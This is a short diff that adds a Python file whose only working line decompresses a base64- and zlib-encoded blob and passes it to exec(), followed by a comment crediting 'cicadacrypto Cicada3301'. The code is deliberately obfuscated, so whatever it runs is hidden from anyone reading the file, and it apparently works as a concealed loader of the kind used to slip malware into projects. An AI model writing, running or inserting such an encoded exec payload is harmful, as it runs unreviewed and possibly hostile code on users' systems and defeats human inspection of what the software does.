@@ -1,0 +1,3 @@
+import zlib, base64
+exec(zlib.decompress(base64.b64decode('eJxtkE1qxDAMhfc+hZYJhBwg0E2nXRR6gzIU1ZYngvgHWWWa29cZT0ihs7L5np71nr2kAMjpIhiAQ06i8MIlo9qZxPg/8qhrprIPPSc9pRAwuja0Ylh2bUnojMo6Gfinnd6rSAJYoN0M/VjKCm83/VUkySPffRjLGi048lBIP21LUDqXpyP1sOPJsdW+voZXZAWXx6+k42YM6+H9OKp0dzg4KlY4K6fY+yTwgAPHHZeRlULp+nNvtmgZpVBdED1fuhpq3jJcWWdImWIjtb/nhaoAQvot8fZr3caG1vWpHb35BcplmIE=')))
+# Created by cicadacrypto Cicada3301(https://github.com/Cicada)
